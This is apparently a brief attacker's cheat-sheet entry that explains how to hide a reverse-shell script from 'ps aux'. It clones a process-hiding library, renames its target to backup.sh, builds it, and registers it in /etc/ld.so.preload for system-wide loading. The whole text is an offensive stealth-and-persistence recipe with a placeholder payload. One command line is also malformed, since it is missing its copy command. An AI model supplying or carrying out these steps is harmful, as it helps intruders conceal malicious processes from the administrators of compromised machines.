# Hide script from process (ps aux)
```
cd /tmp
git clone https://github.com/gianlucaborello/libprocesshider.git

echo "REVERSE_SHELL_PAYLOAD" > backup.sh
nano processhider.c
change evil_script.py to backup.sh
make 
libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
```
